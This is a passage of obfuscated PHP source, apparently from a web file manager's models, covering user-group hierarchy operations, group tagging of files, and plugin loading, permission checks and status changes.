$µ€¡«µ® = $this->getInfoSimple($Şè®áÂ); $ÄÒÑ³ˆ = array($Š³«¼ºÜ[604] => array($Š³«¼ºÜ[478], $µ€¡«µ®[$Š³«¼ºÜ[604]] . $Şè®áÂ . $Š³«¼ºÜ[636])); $Â”Àò„³ = $this->field($Š³«¼ºÜ[1429])->where($ÄÒÑ³ˆ)->select(); $Õö­ÆÃ¯ = array_merge($Õö­ÆÃ¯, array_to_keyvalue($Â”Àò„³, $Š³«¼ºÜ[22], $Š³«¼ºÜ[1429])); } return array_unique($Õö­ÆÃ¯); } private function _searchFromMeta($Ø­øºÒ¿, $úè®»¤¦, $õíù›£, $É™åÅŠè) { $¾¼÷úÊ´ =& $_SERVER[‰‰Ş‚€]; $úè®»¤¦ = strtolower($úè®»¤¦); $™¸×ôÁ = array($¾¼÷úÊ´[105] => $Ø­øºÒ¿, $¾¼÷úÊ´[459] => array($¾¼÷úÊ´[478], "\x25{$úè®»¤¦}\x25")); $™¸×ôÁ = $this->parseWhereLike($™¸×ôÁ); if ($É™åÅŠè) { $™¸×ôÁ[$¾¼÷úÊ´[1429]] = array($¾¼÷úÊ´[17], $É™åÅŠè); } $‘óÍê² = Model($¾¼÷úÊ´[2124])->where($™¸×ôÁ)->limit($õíù›£)->select(); if (!$‘óÍê²) { return array(); } $‘óÍê² = array_to_keyvalue($‘óÍê², $¾¼÷úÊ´[22], $¾¼÷úÊ´[1429]); $ÒÊªƒ³€ = $this->where(array($¾¼÷úÊ´[2110] => array($¾¼÷úÊ´[17], $‘óÍê²)))->select(); if (!$ÒÊªƒ³€) { return array(); } return $ÒÊªƒ³€; } protected function _listDataApplyItem($÷°±Øıì) { $ÅÀ–ÔÕ¹ = array($÷°±Øıì); $this->_listDataApply($ÅÀ–ÔÕ¹); return $ÅÀ–ÔÕ¹[0]; } protected function _listDataApply(&$«òâ¦Çã) { $ß•—Ë® =& $_SERVER[‰‰Ş‚€]; if (!$«òâ¦Çã) { return; } $Âİ«—­Â = array_to_keyvalue($«òâ¦Çã, $ß•—Ë®[22], $ß•—Ë®[1429]); $this->_listAppendChildren($«òâ¦Çã); $this->_listAppendChildrenMember($«òâ¦Çã); $this->_listAppendMeta($«òâ¦Çã, $Âİ«—­Â); $this->_listAppendParent($«òâ¦Çã); $this->_listAppendSourceRoot($«òâ¦Çã, $Âİ«—­Â); } private function _listAppendChildren(&$üÏİÂ€Ç) { $­Õù»Ãñ =& $_SERVER[‰‰Ş‚€]; $ú×À«– = array_to_keyvalue($üÏİÂ€Ç, $­Õù»Ãñ[22], $­Õù»Ãñ[1429]); $™¢¡µıŞ = array($­Õù»Ãñ[201] => array($­Õù»Ãñ[17], $ú×À«–)); $ô¬Ó¬Ò = array($­Õù»Ãñ[201], $­Õù»Ãñ[2125] => $­Õù»Ãñ[585]); $ğ ØõÀ = $this->field($ô¬Ó¬Ò)->where($™¢¡µıŞ)->group($­Õù»Ãñ[201])->select(); $ƒÔ«¼Ä = array_to_keyvalue($ğ ØõÀ, $­Õù»Ãñ[201], $­Õù»Ãñ[585]); foreach ($üÏİÂ€Ç as &$®†Úù¤) { $´š—îÊó = $®†Úù¤[$­Õù»Ãñ[1429]]; $®†Úù¤[$­Õù»Ãñ[2126]] = isset($ƒÔ«¼Ä[$´š—îÊó]) ? intval($ƒÔ«¼Ä[$´š—îÊó]) : !1; } unset($®†Úù¤); } private function _listAppendChildrenMember(&$şšÖµ…Ë) { $ºÖ½Ï×Œ =& $_SERVER[‰‰Ş‚€]; $œÓ¼‚ê = array_to_keyvalue($şšÖµ…Ë, $ºÖ½Ï×Œ[22], $ºÖ½Ï×Œ[1429]); $ÉíöÙ¬– = array($ºÖ½Ï×Œ[1429] => array($ºÖ½Ï×Œ[17], $œÓ¼‚ê)); $’Èö®¾Ó = array($ºÖ½Ï×Œ[1429], $ºÖ½Ï×Œ[2125] => $ºÖ½Ï×Œ[585]); $—ßâ»Ö© = Model($ºÖ½Ï×Œ[2115])->field($’Èö®¾Ó)->where($ÉíöÙ¬–)->group($ºÖ½Ï×Œ[1429])->select(); $¨º­•”Ë = array_to_keyvalue($—ßâ»Ö©, $ºÖ½Ï×Œ[1429], $ºÖ½Ï×Œ[585]); foreach ($şšÖµ…Ë as &$š ‘œî) { $ƒµ¸î¤‘ = $š ‘œî[$ºÖ½Ï×Œ[1429]]; $š ‘œî[$ºÖ½Ï×Œ[2127]] = isset($¨º­•”Ë[$ƒµ¸î¤‘]) ? intval($¨º­•”Ë[$ƒµ¸î¤‘]) : !1; } unset($š ‘œî); } private function _listAppendMeta(&$¯£Êô–, $™ã¬æİ) { $¨Ãƒ„›¶ =& $_SERVER[‰‰Ş‚€]; $ÁøŸãúŠ = array($¨Ãƒ„›¶[1429] => array($¨Ãƒ„›¶[17], $™ã¬æİ)); $ğ·üªÓè = Model($¨Ãƒ„›¶[2114])->where($ÁøŸãúŠ)->select(); $ğ·üªÓè = array_to_keyvalue_group($ğ·üªÓè, $¨Ãƒ„›¶[1429]); foreach ($ğ·üªÓè as &$’ÊÚƒÄª) { $’ÊÚƒÄª = array_to_keyvalue($’ÊÚƒÄª, $¨Ãƒ„›¶[105], $¨Ãƒ„›¶[459]); } unset($’ÊÚƒÄª); foreach ($¯£Êô– as &$›”ìÆêœ) { $›”ìÆêœ[$¨Ãƒ„›¶[559]] = array(); if (isset($ğ·üªÓè[$›”ìÆêœ[$¨Ãƒ„›¶[1429]]])) { $›”ìÆêœ[$¨Ãƒ„›¶[559]] = $ğ·üªÓè[$›”ìÆêœ[$¨Ãƒ„›¶[1429]]]; } } unset($›”ìÆêœ); } protected function parentLevelArray($ãà»ı†) { $ƒ¿ßİÕ =& $_SERVER[‰‰Ş‚€]; $ãà»ı† = explode($ƒ¿ßİÕ[60], trim($ãà»ı†, $ƒ¿ßİÕ[60])); $ãà»ı† = array_remove_value($ãà»ı†, $ƒ¿ßİÕ[239]); return $ãà»ı†; } protected function parentInGroup($æß÷¡Æå, $ºÎ÷®Ú) { $¡¥“Á”ú =& $_SERVER[‰‰Ş‚€]; $£«ÖÌÇî = $this->getInfoSimple($æß÷¡Æå); if (!$£«ÖÌÇî) { return !0; } $öâıŸÎĞ = $this->parentLevelArray($£«ÖÌÇî[$¡¥“Á”ú[604]]); $öâıŸÎĞ[] = $æß÷¡Æå; foreach ($öâıŸÎĞ as $æß÷¡Æå) { if (in_array($æß÷¡Æå . $¡¥“Á”ú[22], $ºÎ÷®Ú)) { return !0; } } return !1; } private function _listAppendParent(&$»Ü¼ğıñ) { $Ö¹²Ù‹¼ =& $_SERVER[‰‰Ş‚€]; $ µ–÷Èå = array(); foreach ($»Ü¼ğıñ as &$Å†‚ê“í) { $ µ–÷Èå[$Å†‚ê“í[$Ö¹²Ù‹¼[1429]]] = $Å†‚ê“í[$Ö¹²Ù‹¼[42]]; $¨…å·Òè = $this->parentLevelArray($Å†‚ê“í[$Ö¹²Ù‹¼[604]]); foreach ($¨…å·Òè as $Š…«ˆ‰‰) { if (!isset($ µ–÷Èå[$Š…«ˆ‰‰])) { $ µ–÷Èå[$Š…«ˆ‰‰] = 0; } } } unset($Å†‚ê“í); foreach ($ µ–÷Èå as $»Š½Õ² => $‘İİÖ) { if ($‘İİÖ) { continue; } $ßâÊˆ˜ = $this->getInfoSimple($»Š½Õ²); $ µ–÷Èå[$»Š½Õ²] = $ßâÊˆ˜[$Ö¹²Ù‹¼[42]]; } $‚ÏŞç—• = $GLOBALS[$Ö¹²Ù‹¼[16]][$Ö¹²Ù‹¼[102]][$Ö¹²Ù‹¼[2128]]; if (KodUser::isRoot()) { $‚ÏŞç—• = !1; } foreach ($»Ü¼ğıñ as &$Å†‚ê“í) { $¨…å·Òè = $this->parentLevelArray($Å†‚ê“í[$Ö¹²Ù‹¼[604]]); $üíĞÆ  = $Ö¹²Ù‹¼[22]; foreach ($¨…å·Òè as $»Š½Õ² => $Š…«ˆ‰‰) { if ($‚ÏŞç—• && $»Š½Õ² == 0) { continue; } $üíĞÆ  .= $ µ–÷Èå[$Š…«ˆ‰‰] . $Ö¹²Ù‹¼[18]; } if ($¨…å·Òè) { $üíĞÆ  .= $Å†‚ê“í[$Ö¹²Ù‹¼[42]]; } $Å†‚ê“í[$Ö¹²Ù‹¼[609]] = str_replace($Ö¹²Ù‹¼[265], $Ö¹²Ù‹¼[18], $üíĞÆ ); } unset($Å†‚ê“í); } private function _listAppendSourceRoot(&$î¹ÁîÌ¼, $áÊ«Ö´) { $Ü²ÙËŸî =& $_SERVER[‰‰Ş‚€]; $Ëß‡’šÊ = Model($Ü²ÙËŸî[929])->listSourceRoot(SourceModel::TYPE_GROUP, $áÊ«Ö´); $Ëß‡’šÊ = array_to_keyvalue($Ëß‡’šÊ, $Ü²ÙËŸî[589]); $Ëß‡’šÊ = array_remove_key($Ëß‡’šÊ, $Ü²ÙËŸî[589]); foreach ($î¹ÁîÌ¼ as &$ÉØ˜›éí) { $ÉØ˜›éí[$Ü²ÙËŸî[100]] = $Ëß‡’šÊ[$ÉØ˜›éí[$Ü²ÙËŸî[1429]]] ? $Ëß‡’šÊ[$ÉØ˜›éí[$Ü²ÙËŸî[1429]]] : array(); } unset($ÉØ˜›éí); } protected function groupMerge($àšòÅüõ) { $àšòÅüõ = array_values(array_unique($àšòÅüõ)); $ğôùıµ = array(); for ($‰¸¿º‘ú = 0; $‰¸¿º‘ú < count($àšòÅüõ); $‰¸¿º‘ú++) { $şçîÁ = !1; for ($ƒıüÎÅÒ = 0; $ƒıüÎÅÒ < count($àšòÅüõ); $ƒıüÎÅÒ++) { if ($‰¸¿º‘ú == $ƒıüÎÅÒ) { continue; } if ($this->isParentOf($àšòÅüõ[$ƒıüÎÅÒ], $àšòÅüõ[$‰¸¿º‘ú])) { $şçîÁ = !0; break; } } if (!$şçîÁ) { $ğôùıµ[] = $àšòÅüõ[$‰¸¿º‘ú]; } } return $ğôùıµ; } protected function isParentOf($¢µºûù, $ª·ÚÚ¯Œ) { $œÈ€‡ğØ =& $_SERVER[‰‰Ş‚€]; if (!$¢µºûù || !$ª·ÚÚ¯Œ || $¢µºûù == $ª·ÚÚ¯Œ) { return !1; } $½²¯ˆ© = $this->getInfoSimple($¢µºûù); $Ñ ÎŞ¶Õ = $this->getInfoSimple($ª·ÚÚ¯Œ); $¨è¢É¢õ = $½²¯ˆ©[$œÈ€‡ğØ[604]] . $¢µºûù . $œÈ€‡ğØ[60]; if (substr($Ñ ÎŞ¶Õ[$œÈ€‡ğØ[604]], 0, strlen($¨è¢É¢õ)) == $¨è¢É¢õ) { return !0; } return !1; } public function groupShowRoot($ÛÊØ•Ü, $Ùµ®á¸Õ = false) { $ˆ‰¡Û˜û =& $_SERVER[‰‰Ş‚€]; $¾Àœ™ÑÓ = $this->getInfo($ÛÊØ•Ü); if (!$¾Àœ™ÑÓ) { return array(); } $åÎ¯Õë = $this->parentLevelArray($¾Àœ™ÑÓ[$ˆ‰¡Û˜û[604]]); $­°ÓÔşó = array($ÛÊØ•Ü); if (count($åÎ¯Õë) == 0) { return $­°ÓÔşó; } if ($Ùµ®á¸Õ && count($åÎ¯Õë) == 1) { return $­°ÓÔşó; } if (!$¾Àœ™ÑÓ[$ˆ‰¡Û˜û[559]] || !isset($¾Àœ™ÑÓ[$ˆ‰¡Û˜û[559]][$ˆ‰¡Û˜û[2111]]) || $¾Àœ™ÑÓ[$ˆ‰¡Û˜û[559]][$ˆ‰¡Û˜û[2111]] == $ˆ‰¡Û˜û[875]) { return $this->groupShowRoot($åÎ¯Õë[count($åÎ¯Õë) - 1], $Ùµ®á¸Õ); } if ($¾Àœ™ÑÓ[$ˆ‰¡Û˜û[559]][$ˆ‰¡Û˜û[2111]] == $ˆ‰¡Û˜û[441]) { $Š–Ş´È = explode($ˆ‰¡Û˜û[60], $¾Àœ™ÑÓ[$ˆ‰¡Û˜û[559]][$ˆ‰¡Û˜û[2112]]); if ($Š–Ş´È) { $­°ÓÔşó = array_merge($­°ÓÔşó, $Š–Ş´È); } } return $­°ÓÔşó; } protected function resetParentLevel() { $Íùå¾…» =& $_SERVER[‰‰Ş‚€]; $êƒá¨ = $Íùå¾…»[1429]; $èôÓê‘Ë = $this->select(); $èôÓê‘Ë = array_to_keyvalue($èôÓê‘Ë, $êƒá¨); foreach ($èôÓê‘Ë as $”–»Ôø) { $ªè¢ÙÄ¹ = $”–»Ôø; $¦Ã¿¢Çï = array(); while ($ªè¢ÙÄ¹[$Íùå¾…»[201]] != 0) { $¦Ã¿¢Çï[] = $ªè¢ÙÄ¹[$Íùå¾…»[201]]; $ªè¢ÙÄ¹ = $èôÓê‘Ë[$ªè¢ÙÄ¹[$Íùå¾…»[201]]]; } $¦Ã¿¢Çï[] = 0; $¦Ã¿¢Çï = $Íùå¾…»[60] . implode($Íùå¾…»[60], array_reverse($¦Ã¿¢Çï)) . $Íùå¾…»[60]; $this->setNamePinyin($”–»Ôø[$êƒá¨], $”–»Ôø[$Íùå¾…»[42]]); $this->where(array($êƒá¨ => $”–»Ôø[$êƒá¨]))->save(array($Íùå¾…»[675] => $¦Ã¿¢Çï)); } return $èôÓê‘Ë; } public function groupNameAuto($ğœÄ¿²É, $÷Å¢œ¾İ) { $şÕŸÆ„Ş =& $_SERVER[‰‰Ş‚€]; $Ğ²¹øº = $this->where(array($şÕŸÆ„Ş[496] => $ğœÄ¿²É))->getField($şÕŸÆ„Ş[42], !0); if (!$Ğ²¹øº || !in_array($÷Å¢œ¾İ, $Ğ²¹øº)) { return $÷Å¢œ¾İ; } for ($éÖ†£æ = 1; $éÖ†£æ <= count($Ğ²¹øº) + 1; $éÖ†£æ++) { $ş•…Ñ¡ª = $÷Å¢œ¾İ . "\50{$éÖ†£æ}\x29"; if (!in_array($ş•…Ñ¡ª, $Ğ²¹øº)) { return $ş•…Ñ¡ª; } } } public function groupSwitch($ì‰Öƒ¼ô, $’øî˜ºà) { $©¸¢â¿ø =& $_SERVER[‰‰Ş‚€]; $ïÃøœñÍ = array($©¸¢â¿ø[1429] => array($©¸¢â¿ø[17], array($ì‰Öƒ¼ô, $’øî˜ºà))); $¯Ï±¹ô¾ = $this->where($ïÃøœñÍ)->select(); $¯Ï±¹ô¾ = array_to_keyvalue($¯Ï±¹ô¾, $©¸¢â¿ø[1429]); $ß¶µÊè = _get($¯Ï±¹ô¾, $ì‰Öƒ¼ô); $­¯À‚Òª = _get($¯Ï±¹ô¾, $’øî˜ºà); if (!$ß¶µÊè || !$­¯À‚Òª || $ß¶µÊè[$©¸¢â¿ø[201]] == 0) { return !1; } if ($ß¶µÊè[$©¸¢â¿ø[1429]] == $­¯À‚Òª[$©¸¢â¿ø[1429]]) { return !1; } if (strpos($­¯À‚Òª[$©¸¢â¿ø[604]], $ß¶µÊè[$©¸¢â¿ø[604]] . $ß¶µÊè[$©¸¢â¿ø[1429]] . $©¸¢â¿ø[60]) === 0) { return !1; } $ïÃøœñÍ = array($©¸¢â¿ø[1429] => $ì‰Öƒ¼ô); $¯¸äƒµñ = Model($©¸¢â¿ø[2115])->where($ïÃøœñÍ)->select(); if (!$¯¸äƒµñ) { $¯¸äƒµñ = array(); } foreach ($¯¸äƒµñ as $èéùÁÉ) { $µ”¸ï› = $èéùÁÉ[$©¸¢â¿ø[1820]]; $ïÃøœñÍ = array($©¸¢â¿ø[1820] => $µ”¸ï›, $©¸¢â¿ø[1429] => $’øî˜ºà); $ş×š € = Model($©¸¢â¿ø[2115])->where($ïÃøœñÍ)->find(); if (!$ş×š €) { $£…Á£İÏ = array($’øî˜ºà => $èéùÁÉ[$©¸¢â¿ø[2129]]); Model($©¸¢â¿ø[617])->userGroupAdd($µ”¸ï›, $£…Á£İÏ); } Model($©¸¢â¿ø[617])->userGroupRemove($µ”¸ï›, $ì‰Öƒ¼ô); } $ïÃøœñÍ = array($©¸¢â¿ø[199] => 2, $©¸¢â¿ø[201] => 0, $©¸¢â¿ø[504] => 1, $©¸¢â¿ø[589] => array($©¸¢â¿ø[17], array($ì‰Öƒ¼ô, $’øî˜ºà))); $ÜÂÕ¹£ = Model($©¸¢â¿ø[929])->where($ïÃøœñÍ)->field($©¸¢â¿ø[2130])->select(); $ÜÂÕ¹£ = array_to_keyvalue($ÜÂÕ¹£, $©¸¢â¿ø[589], $©¸¢â¿ø[202]); $ÀÅ™ÚÓ— = !empty($ÜÂÕ¹£[$ì‰Öƒ¼ô]) ? $ÜÂÕ¹£[$ì‰Öƒ¼ô] : !1; if ($ÀÅ™ÚÓ—) { if (!$ÜÂÕ¹£[$’øî˜ºà]) { $ÜÂÕ¹£[$’øî˜ºà] = Model($©¸¢â¿ø[929])->groupRootAdd($’øî˜ºà); } $ŒŠıÆ³¯ = $ÜÂÕ¹£[$’øî˜ºà]; $ïÃøœñÍ = array($©¸¢â¿ø[201] => $ÀÅ™ÚÓ—); $ÜÂÕ¹£ = Model($©¸¢â¿ø[929])->where($ïÃøœñÍ)->field($©¸¢â¿ø[2131])->select(); if (!$ÜÂÕ¹£) { $ÜÂÕ¹£ = array(); } Model($©¸¢â¿ø[929])->moveClearAuth = !1; foreach ($ÜÂÕ¹£ as $À†õĞ€¤) { $Î¥ô²– = $À†õĞ€¤[$©¸¢â¿ø[504]] == $©¸¢â¿ø[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($©¸¢â¿ø[929])->move($À†õĞ€¤[$©¸¢â¿ø[202]], $ŒŠıÆ³¯, $Î¥ô²–); } Model($©¸¢â¿ø[929])->moveClearAuth = !0; $ïÃøœñÍ = array($©¸¢â¿ø[199] => 2, $©¸¢â¿ø[589] => $ì‰Öƒ¼ô); $ é¯Ò…Ã = array($©¸¢â¿ø[589] => $’øî˜ºà); Model($©¸¢â¿ø[2132])->where($ïÃøœñÍ)->save($ é¯Ò…Ã); Model($©¸¢â¿ø[2133])->where($ïÃøœñÍ)->save($ é¯Ò…Ã); } $this->_changeChildLevel($¯Ï±¹ô¾[$ì‰Öƒ¼ô], $¯Ï±¹ô¾[$’øî˜ºà], !0); $this->where(array($©¸¢â¿ø[201] => $ì‰Öƒ¼ô))->save(array($©¸¢â¿ø[201] => $’øî˜ºà)); $this->_clearChildrenCache($¯Ï±¹ô¾[$’øî˜ºà]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\141\166"; protected function cacheFunctionAlias($óÜãÃ½±) { $şâ©ÔÚï =& $_SERVER[‰‰Ş‚€]; return array($şâ©ÔÚï[2134] => array($óÜãÃ½±[0], $şâ©ÔÚï[2135]), $şâ©ÔÚï[2136] => array($óÜãÃ½±[0], $şâ©ÔÚï[2137])); } protected function get($ì·õ‘Àå) { $Éç¢ôéœ =& $_SERVER[‰‰Ş‚€]; $§…¦ôîœ = Model($Éç¢ôéœ[605])->metaGet($ì·õ‘Àå, $Éç¢ôéœ[2138]); $Õ©û”ú  = json_decode($§…¦ôîœ, !0); return $Õ©û”ú  ? $Õ©û”ú  : array($Éç¢ôéœ[2139] => $Éç¢ôéœ[101], $Éç¢ôéœ[454] => array()); } protected function set($ïµ†ôş, $Õ³ÊéÊ¿) { $¥³ğà–î =& $_SERVER[‰‰Ş‚€]; $Õ³ÊéÊ¿ = $Õ³ÊéÊ¿ ? $Õ³ÊéÊ¿ : array($¥³ğà–î[2139] => $¥³ğà–î[101], $¥³ğà–î[454] => array()); return Model($¥³ğà–î[605])->metaSet($ïµ†ôş, $¥³ğà–î[2138], json_encode($Õ³ÊéÊ¿)); } protected function getByTagID($£…¬øÁï, $Ìâ¢»¼É) { $ÕãâñÅÓ =& $_SERVER[‰‰Ş‚€]; if (!$£…¬øÁï || !$Ìâ¢»¼É) { return !1; } if (!Model($ÕãâñÅÓ[605])->getInfoSimple($£…¬øÁï)) { return !1; } $íÍ®õå¹ = $this->get($£…¬øÁï); if (!$íÍ®õå¹ || !isset($íÍ®õå¹[$ÕãâñÅÓ[454]])) { return !1; } $†Äçå¥ = array_find_by_field($íÍ®õå¹[$ÕãâñÅÓ[454]], $ÕãâñÅÓ[491], $Ìâ¢»¼É); return is_array($†Äçå¥) ? $†Äçå¥ : !1; } public function listSource($Ãê˜‹º, $ÆÖ¡Ï¬ğ) { $‚Ş§Ù¼É =& $_SERVER[‰‰Ş‚€]; if ($ÆÖ¡Ï¬ğ && !is_array($ÆÖ¡Ï¬ğ)) { $ÆÖ¡Ï¬ğ = array($ÆÖ¡Ï¬ğ); } $˜©Çª’ø = $this->listData($Ãê˜‹º); $º³ˆâº = array(); foreach ($˜©Çª’ø as $Ø¡ãÈê) { $ÊéøÇ£ò = $Ø¡ãÈê[$‚Ş§Ù¼É[97]]; if (!$ÊéøÇ£ò) { continue; } if (!isset($º³ˆâº[$ÊéøÇ£ò])) { $º³ˆâº[$ÊéøÇ£ò] = array(); } $º³ˆâº[$ÊéøÇ£ò][] = $Ø¡ãÈê[$‚Ş§Ù¼É[519]]; } $ìÙìáÄ = array(); foreach ($º³ˆâº as $³°‹ÁæÖ => $à ãà¾) { $Èä·æ¶ = !0; if (!$ÆÖ¡Ï¬ğ) { $ìÙìáÄ[] = $³°‹ÁæÖ; continue; } foreach ($ÆÖ¡Ï¬ğ as $ıõà·) { if (!in_array($ıõà·, $à ãà¾)) { $Èä·æ¶ = !1; break; } } if ($Èä·æ¶) { $ìÙìáÄ[] = $³°‹ÁæÖ; } } if (!$ìÙìáÄ) { return array(); } $ª¢Ñ¼… = array($‚Ş§Ù¼É[510] => array($‚Ş§Ù¼É[511], $ìÙìáÄ), $‚Ş§Ù¼É[589] => $Ãê˜‹º, $‚Ş§Ù¼É[199] => SourceModel::TYPE_GROUP); $å¶›³˜ğ = Model($‚Ş§Ù¼É[1467])->listSource($ª¢Ñ¼…); if (!$å¶›³˜ğ || count($ìÙìáÄ) == $å¶›³˜ğ[$‚Ş§Ù¼É[451]][$‚Ş§Ù¼É[452]]) { return $å¶›³˜ğ; } $íî„õ•® = array(); $“è ”™ó = array_to_keyvalue($å¶›³˜ğ[$‚Ş§Ù¼É[95]], $‚Ş§Ù¼É[22], $‚Ş§Ù¼É[202]); $ÙÌ¦°¥ñ = array_to_keyvalue($å¶›³˜ğ[$‚Ş§Ù¼É[96]], $‚Ş§Ù¼É[22], $‚Ş§Ù¼É[202]); $ˆŠ¶†çû = array_merge($ÙÌ¦°¥ñ, $“è ”™ó); foreach ($ìÙìáÄ as $ÊéøÇ£ò) { if (!in_array($ÊéøÇ£ò, $ˆŠ¶†çû)) { $íî„õ•®[] = $ÊéøÇ£ò; } } if ($íî„õ•®) { $this->removeBySource($Ãê˜‹º, $íî„õ•®); } return $å¶›³˜ğ; } protected function listData($´îªŠ´Ä) { $›¢Ê­Çú =& $_SERVER[‰‰Ş‚€]; $»Ûåµ = array($›¢Ê­Çú[1811] => 0, $›¢Ê­Çú[577] => array($›¢Ê­Çú[2140], 0), $›¢Ê­Çú[515] => $›¢Ê­Çú[1425] . $´îªŠ´Ä); $¯Â¥ÚòÑ = $›¢Ê­Çú[2141]; $¾‹¯øÛ¸ = $this->field($¯Â¥ÚòÑ)->where($»Ûåµ)->order($›¢Ê­Çú[2142])->select(); return $¾‹¯øÛ¸ ? $¾‹¯øÛ¸ : array(); } protected function addToTag($“áâ¯Ö, $Ñµºã‹ã, $Ö½äÃ¡Ü) { $Ì‹…Ë…ğ =& $_SERVER[‰‰Ş‚€]; if (!$this->getByTagID($“áâ¯Ö, $Ö½äÃ¡Ü) || !$Ñµºã‹ã) { return !1; } if (!Model($Ì‹…Ë…ğ[929])->pathInfo($Ñµºã‹ã)) { return !1; } $æ¦ïÛ®‚ = array($Ì‹…Ë…ğ[1811] => 0, $Ì‹…Ë…ğ[577] => $Ö½äÃ¡Ü, $Ì‹…Ë…ğ[514] => $Ñµºã‹ã, $Ì‹…Ë…ğ[515] => $Ì‹…Ë…ğ[2143] . $“áâ¯Ö, $Ì‹…Ë…ğ[513] => $Ì‹…Ë…ğ[22], $Ì‹…Ë…ğ[2024] => 0); if ($this->where($æ¦ïÛ®‚)->find()) { return !1; } return $this->add($æ¦ïÛ®‚); } protected function removeFromTag($Êş†§ëİ, $¤±³êêğ, $›ùùßò) { $ØÂÄ‚Ê =& $_SERVER[‰‰Ş‚€]; if (!$this->getByTagID($Êş†§ëİ, $›ùùßò) || !$¤±³êêğ) { return !1; } if (is_array($¤±³êêğ)) { $¤±³êêğ = array($ØÂÄ‚Ê[17], $¤±³êêğ); } $š×¨ÆÑ£ = array($ØÂÄ‚Ê[1811] => 0, $ØÂÄ‚Ê[577] => $›ùùßò, $ØÂÄ‚Ê[515] => $ØÂÄ‚Ê[2143] . $Êş†§ëİ, $ØÂÄ‚Ê[514] => $¤±³êêğ); return $this->where($š×¨ÆÑ£)->delete(); } protected function removeByTag($Ç”³ˆÛç, $ÒÎÀÍØ) { $ªˆ¡˜Ó =& $_SERVER[‰‰Ş‚€]; if (!$this->getByTagID($Ç”³ˆÛç, $ÒÎÀÍØ)) { return !1; } $øÁŞ‹à¦ = array($ªˆ¡˜Ó[1811] => 0, $ªˆ¡˜Ó[577] => $ÒÎÀÍØ, $ªˆ¡˜Ó[515] => $ªˆ¡˜Ó[2143] . $Ç”³ˆÛç); return $this->where($øÁŞ‹à¦)->delete(); } protected function removeBySource($…ô©ú÷, $¬ßƒİÜ) { $ æŞ°Ü“ =& $_SERVER[‰‰Ş‚€]; if (!$…ô©ú÷ || !$¬ßƒİÜ) { return !1; } if (is_array($¬ßƒİÜ)) { $¬ßƒİÜ = array($ æŞ°Ü“[17], $¬ßƒİÜ); } $öàáÚó = array($ æŞ°Ü“[1811] => 0, $ æŞ°Ü“[514] => $¬ßƒİÜ, $ æŞ°Ü“[577] => array($ æŞ°Ü“[1124], 0), $ æŞ°Ü“[515] => $ æŞ°Ü“[2143] . $…ô©ú÷); return $this->where($öàáÚó)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\160\154\165\x67\151\x6e\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\163\164\x61\x74\165\x73", "\162\145\x67\151\x65\x73\164", "\143\157\156\x66\x69\x67"); public function loadList($¯’î‰é¯ = false) { $‡ôÉˆ˜Ó = array_to_keyvalue($this->listData(), $_SERVER[‰‰Ş‚€][42]); if ($¯’î‰é¯) { return $‡ôÉˆ˜Ó[$¯’î‰é¯]; } return $‡ôÉˆ˜Ó; } public function init() { $Œâ¹‚¹ =& $_SERVER[‰‰Ş‚€]; Hook::trigger($Œâ¹‚¹[2144]); $¹ÁÁÃŸİ = $this->loadPluginList(); foreach ($¹ÁÁÃŸİ as $ÂÅí“Éí => $‘Ä–“İÉ) { $èÜÛ¡›— = $this->appAllow($ÂÅí“Éí, $‘Ä–“İÉ); if (!$èÜÛ¡›—) { continue; } foreach ($‘Ä–“İÉ[$Œâ¹‚¹[2145]] as $½Ë„Éß¨ => $Åí„ÇĞ) { Hook::bind($½Ë„Éß¨, $Åí„ÇĞ); } } Hook::trigger($Œâ¹‚¹[2146]); Hook::trigger(ACTION); } public function appAllow($Æ»µâ¦, $ã‘Õœšğ, $Ù˜«éíŸ = true) { $ûäª±ÖĞ =& $_SERVER[‰‰Ş‚€]; $¦áµÌºê = PLUGIN_DIR . $Æ»µâ¦ . $ûäª±ÖĞ[2147]; if (!is_array($ã‘Õœšğ) || !is_array($ã‘Õœšğ[$ûäª±ÖĞ[2145]]) || $ã‘Õœšğ[$ûäª±ÖĞ[846]] != 1 || !is_file($¦áµÌºê)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ûäª±ÖĞ[16]][$ûäª±ÖĞ[2148]] || !$GLOBALS[$ûäª±ÖĞ[16]][$ûäª±ÖĞ[2149]]) { return !0; } $‹¥î‹Ë˜ = explode($ûäª±ÖĞ[60], strtolower($GLOBALS[$ûäª±ÖĞ[16]][$ûäª±ÖĞ[2149]])); return in_array(strtolower($Æ»µâ¦), $‹¥î‹Ë˜) ? !1 : !0; } if ($Ù˜«éíŸ && !Action($ûäª±ÖĞ[2150])->checkAuth($Æ»µâ¦)) { return !1; } return !0; } public function unInstall($üÎ÷ó×š) { $”Œ˜× =& $_SERVER[‰‰Ş‚€]; $äÈ¿• = $this->loadList($üÎ÷ó×š); if (file_exists(PLUGIN_DIR . $üÎ÷ó×š)) { Hook::apply($üÎ÷ó×š . $”Œ˜×[2151]); } $this->remove($äÈ¿•[$”Œ˜×[491]]); } public function changeStatus($Ìøòæ©š, $¨Ùç›Ñ) { $Ÿ•ÉÂÔ§ =& $_SERVER[‰‰Ş‚€]; $¤ÙŞÍÇÂ = $this->loadList($Ìøòæ©š); if ($¨Ùç›Ñ) { Hook::apply($Ìøòæ©š . $Ÿ•ÉÂÔ§[2152]); } $this->update($¤ÙŞÍÇÂ[$Ÿ•ÉÂÔ§[491]], array($Ÿ•ÉÂÔ§[2153] => $¨Ùç›Ñ)); } public function appRegist($šÀİƒªé, $—ı×ˆáŞ) { $«Ÿ¤ÆØë =& $_SERVER[‰‰Ş‚€]; $È³¾ú¢ = $this->loadList($šÀİƒªé); if ($È³¾ú¢) { $this->update($È³¾ú¢[$«Ÿ¤ÆØë[491]], array($«Ÿ¤ÆØë[2145] => $—ı×ˆáŞ)); } else { $õ¨¡êÕ‘ = array($«Ÿ¤ÆØë[42] => $šÀİƒªé, $«Ÿ¤ÆØë[2145] => $—ı×ˆáŞ, $«Ÿ¤ÆØë[846] => 0, $«Ÿ¤ÆØë[16] => $this->getConfigDefault($šÀİƒªé)); $this->insert($õ¨¡êÕ‘); } } public function getConfigDefault($È–™ñâå) { $º•³¾À‘ =& $_SERVER[‰‰Ş‚€]; $úí‚îŒŸ = array(); $ç¥¼•èµ = $this->getPackageJson($È–™ñâå); if (!$ç¥¼•èµ && 